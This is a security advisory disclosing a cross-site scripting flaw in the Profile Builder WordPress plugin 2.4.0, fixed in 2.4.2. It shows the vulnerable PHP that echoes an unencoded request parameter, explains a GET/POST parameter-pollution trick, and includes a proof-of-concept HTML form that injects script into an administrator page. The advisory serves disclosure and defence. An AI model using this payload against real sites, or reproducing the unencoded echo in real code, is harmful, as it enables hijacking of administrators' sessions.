------------------------------------------------------------------------
Cross-Site Scripting vulnerability in Profile Builder WordPress Plugin
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Profile Builder
WordPress Plugin. This issue allows an attacker to perform a wide
variety of actions, such as stealing Administrators' session tokens, or
performing arbitrary actions on their behalf. In order to exploit this
issue, the attacker has to lure/force a logged on WordPress
Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0014

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Profile Builder - front-end user
registration, user profile and user login WordPress Plugin version
2.4.0.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in Profile Builder version 2.4.2.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_profile_builder_wordpress_plugin.html

The issue exists in the file class-email-confirmation.php and is caused by the lack of output encoding on the page request parameter. The vulnerable code is listed below.

<form id="movies-filter" method="get">
   <!-- For plugins, we also need to ensure that the form posts back to our current page -->
   <input type="hidden" name="page" value="<?php echo $_REQUEST['page'] ?>" />
   <!-- Now we can render the completed list table -->
   <?php $listTable->display() ?>
</form>

Normally, the page URL parameter is validated by WordPress, which prevents Cross-Site Scripting. However in this case the value of page is obtained from $_REQUEST, not from $_GET. This allows for parameter pollution where the attacker puts a benign page value in the URL and simultaneously submits a malicious page value as POST parameter.
Proof of concept

<html>
   <body>
      <form action="http://<target>/wp-admin/users.php?page=unconfirmed_emails" method="POST">
         <input type="hidden" name="page" value="&quot;<script>alert(document.cookie);</script>" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>

------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
